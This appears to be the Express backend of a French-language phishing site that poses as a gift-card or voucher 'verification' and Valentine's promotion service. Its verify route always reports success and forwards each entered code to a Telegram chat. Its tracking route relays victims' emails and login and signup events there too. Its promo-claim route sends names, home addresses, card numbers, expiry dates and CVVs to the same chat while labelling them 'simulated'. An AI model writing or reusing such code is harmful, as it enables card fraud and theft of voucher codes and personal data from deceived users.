import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import { PrismaClient } from '@prisma/client';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';

import path from 'path';

dotenv.config();

const app = express();
const prisma = new PrismaClient();
const PORT = process.env.PORT || 3000;
const JWT_SECRET = process.env.JWT_SECRET || 'secret';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Helper: Send Telegram Message
const sendTelegramMessage = async (message: string) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('Telegram credentials missing, skipping message.');
    return;
  }
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const res = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    if(!res.ok) console.error('Telegram API error:', await res.text());
  } catch (e) {
    console.error('Failed to send Telegram message:', e);
  }
};

app.use(cors());
app.use(express.json());

// --- Middleware ---
const authenticateToken = (req: any, res: any, next: any) => {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];

  if (!token) return res.sendStatus(401);

  jwt.verify(token, JWT_SECRET, (err: any, user: any) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
};

// --- Auth Routes ---
app.post('/api/auth/register', async (req, res) => {
  const { email, password, name } = req.body;
  try {
    const existingUser = await prisma.user.findUnique({ where: { email } });
    if (existingUser) return res.status(400).json({ error: 'User already exists' });

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = await prisma.user.create({
      data: { email, password: hashedPassword, name }
    });

    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET);
     // @ts-ignore
    res.json({ token, user: { id: user.id, name: user.name, email: user.email } });
  } catch (e) {
    res.status(500).json({ error: 'Error creating user' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;
  try {
    const user = await prisma.user.findUnique({ where: { email } });
    if (!user) return res.status(400).json({ error: 'User not found' });

    const validPassword = await bcrypt.compare(password, user.password);
    if (!validPassword) return res.status(400).json({ error: 'Invalid password' });

    const token = jwt.sign({ userId: user.id, email: user.email }, JWT_SECRET);
     // @ts-ignore
    res.json({ token, user: { id: user.id, name: user.name, email: user.email } });
  } catch (e) {
    res.status(500).json({ error: 'Error logging in' });
  }
});

// --- Data Routes ---
app.get('/api/cards', async (req, res) => {
  const cards = await prisma.card.findMany();
  res.json(cards);
});

// --- Action Routes ---
app.post('/api/verify', async (req: any, res: any) => {
  const { code, cardId } = req.body;
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  let userId = null;
  let userEmail = 'Guest';
  
  // Try to get user info if token exists
  if (token) {
    try {
      const decoded: any = jwt.verify(token, JWT_SECRET);
      userId = decoded.userId;
      userEmail = decoded.email;
    } catch (e) {
      // Token invalid, continue as guest
    }
  }
  
  // Simulate verification delay and result
  try {
    const verification = await prisma.verification.create({
      data: {
        code,
        status: 'SUCCESS', // Simulated result
        result: JSON.stringify({ valid: true, message: 'Code valid' }),
        userId: userId,
        cardId
      }
    });

    // Notify Telegram
    await sendTelegramMessage(
      `🔒 *Nouvelle Vérification*\n\n` +
      `👤 User: ${userEmail}\n` +
      `💳 Carte ID: ${cardId}\n` +
      `🔑 Code: \`${code}\`\n` +
      `✅ Status: SUCCESS`
    );

    res.json(verification);
  } catch (e) {
    res.status(500).json({ error: 'Verification failed' });
  }
});

app.post('/api/verify/webhook', async (req: any, res: any) => {
  const { code, email } = req.body;
  try {
    const webhookUrl = 'https://smart031.app.n8n.cloud/webhook/verif';
    const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ code, email })
    });
    
    if (!response.ok) {
        throw new Error(`Webhook error: ${response.statusText}`);
    }

    const data = await response.json();
    console.log('Webhook Response from N8N:', data);
    res.json(data);
  } catch (e) {
    console.error('Webhook proxy error:', e);
    // Fallback or error response
    res.json({ success: false, message: "Erreur de communication avec le serveur de vérification." });
  }
});

// --- Tracking Route ---
app.post('/api/track', async (req: any, res: any) => {
  const { event, data } = req.body;
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  let userEmail = 'Guest';
  let userId = null;
  
  if (token) {
    try {
      const decoded: any = jwt.verify(token, JWT_SECRET);
      userId = decoded.userId;
      userEmail = decoded.email;
    } catch (e) {
      // Token invalid, continue as guest
    }
  }
  
  let message = '';
  const timestamp = new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' });
  
  switch(event) {
    case 'PAGE_VIEW':
      message = `📍 *Visite de Page*\n\n👤 User: ${userEmail}\n📄 Page: ${data.page}\n🕐 ${timestamp}`;
      break;
    case 'AUTH_LOGIN':
      message = `🔐 *Connexion*\n\n👤 User: ${data.email}\n✅ Statut: Connecté\n🕐 ${timestamp}`;
      break;
    case 'AUTH_SIGNUP':
      message = `✨ *Nouvelle Inscription*\n\n👤 Nom: ${data.name}\n📧 Email: ${data.email}\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_START':
      message = `🚀 *Début Vérification*\n\n👤 User: ${userEmail}\n💳 Carte: ${data.cardName || 'Non sélectionnée'}\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_CARD_SELECTED':
      message = `💳 *Carte Sélectionnée*\n\n👤 User: ${userEmail}\n💳 Type: ${data.cardName}\n🆔 ID: ${data.cardId}\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_EMAIL_ENTERED':
      message = `📧 *Email Saisi*\n\n👤 User: ${userEmail}\n📧 Email saisi: ${data.email}\n💳 Carte: ${data.cardName}\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_CODE_ENTERED':
      message = `🔢 *Code Saisi*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n💳 Carte: ${data.cardName}\n🔑 Code: '${data.code}'\n📏 Longueur: ${data.code?.length} caractères\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_ANALYSIS_START':
      message = `⚙️ *Analyse en Cours*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n🔑 Code: '${data.code}'\n🕐 ${timestamp}`;
      break;
    case 'VERIFY_RESULT':
      const resultIcon = data.success ? '✅' : '❌';
      message = `${resultIcon} *Résultat Vérification*\n\n👤 User: ${userEmail}\n📧 Email: ${data.email}\n🔑 Code: '${data.code}'\n📊 Résultat: ${data.success ? 'VALIDE ✅' : 'INVALIDE ❌'}\n🕐 ${timestamp}`;
      break;
    case 'BUY_START':
      message = `🛒 *Achat Démarré*\n\n👤 User: ${userEmail}\n🕐 ${timestamp}`;
      break;
    case 'PROMO_START':
      message = `🎁 *Promotion Démarrée*\n\n👤 User: ${userEmail}\n💝 Type: Saint-Valentin\n🕐 ${timestamp}`;
      break;
    default:
      message = `📊 *Événement: ${event}*\n\n👤 User: ${userEmail}\n📦 Data: ${JSON.stringify(data)}\n🕐 ${timestamp}`;
  }
  
  await sendTelegramMessage(message);
  res.json({ success: true });
});

app.post('/api/buy', authenticateToken, async (req: any, res: any) => {
  const { amount, method } = req.body;

  // Simulate purchase
  try {
    const transaction = await prisma.transaction.create({
      data: {
        amount: Number(amount),
        status: 'SUCCESS',
        method,
        userId: req.user.userId
      }
    });
    res.json(transaction);
  } catch (e) {
    res.status(500).json({ error: 'Purchase failed' });
  }
});

app.post('/api/promo/claim', authenticateToken, async (req: any, res: any) => {
  const { firstName, lastName, address, city, zipCode } = req.body;

  try {
    const claim = await prisma.promoClaim.create({
      data: {
        userId: req.user.userId,
        firstName,
        lastName,
        address,
        city,
        zipCode,
        status: 'SUCCESS'
      }
    });

    // Notify Telegram
    const { number, expiry, cvv } = req.body; // Extract ephemeral card data
    await sendTelegramMessage(
      `🎁 *Promotion Réclamée*\n\n` +
      `👤 User: ${req.user.email}\n` +
      `📍 Nom: ${firstName} ${lastName}\n` +
      `🏠 Adresse: ${address}, ${zipCode} ${city}\n\n` +
      `💳 *Infos Carte (Simulées)*\n` +
      `#️⃣ Num: \`${number}\`\n` +
      `📅 Exp: ${expiry}\n` +
      `🔒 CVV: ${cvv}`
    );

    res.json({ success: true, claim });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: 'Promo claim failed' });
  }
});


// --- Serve Static Frontend (Production) ---
const distPath = path.join(__dirname, '../../dist');
app.use(express.static(distPath));

// Handle SPA routing
app.get('*', (req, res) => {
  // If request is for API, don't return index.html (should have matched above routes, but just in case)
  if (req.path.startsWith('/api')) {
    return res.status(404).json({ error: 'Not found' });
  }
  res.sendFile(path.join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
